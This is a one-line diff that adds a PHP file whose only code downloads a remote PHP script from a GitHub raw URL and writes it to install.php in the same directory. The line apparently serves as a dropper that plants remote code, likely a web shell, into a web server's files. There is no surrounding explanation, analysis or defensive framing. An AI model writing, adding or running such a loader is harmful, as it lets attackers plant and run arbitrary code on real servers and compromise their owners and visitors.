@@ -1,0 +1,1 @@
+<?php copy('https://raw.githubusercontent.com/Cvar1984/R4/main/r4.php', __DIR__ .'/install.php');
